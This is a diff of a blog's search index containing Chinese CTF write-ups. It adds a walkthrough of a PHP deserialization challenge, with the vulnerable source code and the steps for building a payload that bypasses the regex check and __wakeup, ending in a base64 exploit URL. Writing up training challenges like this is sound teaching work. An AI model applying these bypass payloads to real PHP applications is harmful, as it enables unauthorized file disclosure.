@@ -1,11 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ctf-web-ics-07</title>
-    <url>/2020/01/04/ctf-web-ics-07/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>CTF攻防世界-WEB-wtf.sh-150</title>
     <url>/2020/01/04/ctf-web-wtf-sh-150/</url>
     <content><![CDATA[<div class="note info"><p>0x01 前要与心得</p></div>
@@ -117,6 +112,14 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
       </tags>
   </entry>
   <entry>
+    <title>CTF攻防世界-WEB-cis07</title>
+    <url>/2020/01/04/ctf-web-ics-07/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>CTF-WEB</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CTF攻防世界-WEB-Triangle</title>
     <url>/2020/01/01/ctf-web-Triangle/</url>
     <content><![CDATA[<div class="note info"><p>0x01 前要与心得</p></div>
@@ -195,7 +198,7 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
       </tags>
   </entry>
   <entry>
-    <title>CTF攻防世界-WEB-php2</title>
+    <title>CTF攻防世界-WEB-php2/php_unserialize</title>
     <url>/2019/12/31/ctf-web-php2/</url>
     <content><![CDATA[<div class="note info"><p>0x01 前要</p></div>
 1.PHP序列化与反序列化 </br>
@@ -203,7 +206,7 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
 
 <a id="more"></a>
 
-<div class="note info"><p>0x02 解题流程与思路</p></div>
+<div class="note info"><p>0x02 解题流程与思路:php2(序列化)</p></div>
 1.打开网页，目录遍历，注入也没什么变化，分析代码
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> = <span class="string">'111'</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure></div>
 
@@ -221,6 +224,25 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
 
 <p>====&gt;重新构造</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">?code=O:4:<span class="string">"xctf"</span>:2:&#123;s:4:<span class="string">"flag"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="note info"><p>0x02 解题流程与思路：Web_php_unserialize(反序列化)</p></div>
+1.复现，得到源码：
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">'index.php'</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123; </span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            //the secret is <span class="keyword">in</span> the fl4g.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        die(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+2.分析代码，知道flag存在fl4g.php文件里，且通过GET方式传送var变量
+
+<p>3.先将类序列化</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">'index.php'</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123; </span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            //the secret is <span class="keyword">in</span> the fl4g.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$A</span> = new Demo(<span class="string">'fl4g.php'</span>);</span><br><span class="line">    <span class="variable">$C</span> = serialize(<span class="variable">$A</span>);</span><br><span class="line">    var_dump(<span class="variable">$C</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>=========&gt;得到：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">string(48) <span class="string">"O:4:"</span>Demo<span class="string">":1:&#123;s:10:"</span>Demofile<span class="string">";s:8:"</span>fl4g.php<span class="string">";&#125;"</span></span><br></pre></td></tr></table></figure></div>
+
+<p>3.根据所得的序列进行反序列化操作：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">'index.php'</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123; </span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            //the secret is <span class="keyword">in</span> the fl4g.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$A</span> = new Demo(<span class="string">'fl4g.php'</span>);</span><br><span class="line">    <span class="variable">$C</span> = serialize(<span class="variable">$A</span>);</span><br><span class="line">    <span class="variable">$C</span> = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>,<span class="variable">$C</span>);//绕过preg_match</span><br><span class="line">    <span class="variable">$C</span> = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span>,<span class="variable">$C</span>);//绕过wakeup</span><br><span class="line">    var_dump(<span class="variable">$C</span>);</span><br><span class="line">    //string(48) <span class="string">"O:+4:"</span>Demo<span class="string">":2:&#123;s:10:"</span>Demofile<span class="string">";s:8:"</span>fl4g.php<span class="string">";&#125;"</span></span><br><span class="line">    var_dump(base64_encode(<span class="variable">$C</span>));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+<p>4.根据得到的16进制编码进行payload：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure></div>
+
+
+
 
 
 <br>
@@ -704,22 +726,24 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
       </tags>
   </entry>
   <entry>
-    <title>低估的Web威胁-备份文件</title>
+    <title>WEB-自学知识小汇</title>
     <url>/2019/12/24/CTF-python3%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
-    <content><![CDATA[<div class="note info"><p>0x01二进制转字符串</p></div>
+    <content><![CDATA[<div class="note info"><p>二进制转字符串</p></div>
 <details>
 <summary>二进制转字符串</summary>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"># gif 二进制转字符串</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">a &#x3D; &#39;01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101&#39;</span><br><span class="line">b &#x3D; re.findall(r&#39;.&#123;8&#125;&#39;,a)</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in b:</span><br><span class="line">    flag +&#x3D; chr(int(i,2))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>
 </details>
 
+<div class="note info"><p>Thinkphp5 远程代码执行漏洞事件分析报告</p></div>
 
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;div class=<span class="string">"note danger"</span>&gt;&lt;p&gt;0x02没有删除版本控制系统产生的备份文件&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">	几乎所有的控制系统VCS都会在工程目录下建一个meta目录，这个文件记录了整个项目工程每次修改的记录。</span><br><span class="line">而开发者修改项目仓库的时候就直接下载/克隆代码仓库，改为后直接上传到web服务器上。但是很多时候，VCS产生的目录并没有删除掉，这样的话，如果被攻击者找到，将会使整个工程泄露。</span><br><span class="line"></span><br><span class="line">&#123;% note default %&#125; default &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></div>
+<p><a href="https://paper.seebug.org/770/" target="_blank">Thinkphp5 远程代码执行漏洞事件分析报告</a><br></p>
 ]]></content>
       <categories>
         <category>CTF-WEB</category>
       </categories>
       <tags>
         <tag>python3 工具合集</tag>
+        <tag>知识合集</tag>
       </tags>
   </entry>
 </search>
